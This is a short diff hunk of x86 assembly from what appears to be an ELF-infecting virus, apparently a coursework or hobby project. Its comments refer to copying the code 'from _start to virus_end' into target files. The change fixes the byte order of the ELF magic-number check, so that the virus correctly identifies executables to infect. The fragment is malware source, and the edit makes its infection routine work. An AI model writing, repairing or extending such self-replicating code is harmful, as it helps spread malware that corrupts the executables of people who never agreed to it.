@@ -64,7 +64,7 @@ _start:
 	cmp eax, 0
 	jl _print_failure
 	read eax, esp, 4			; read first 4 bytes into esp (reserved place)
-	cmp dword [esp], 0x7f454c46 ;cmp STK_RES to elf magic bytes
+	cmp dword [esp], 0x464c457f ;cmp STK_RES to elf magic bytes
 	jne _print_failure
 	;now we should write the code from _start to virus_end
 	call get_my_loc				;now ecx holds location for next_i
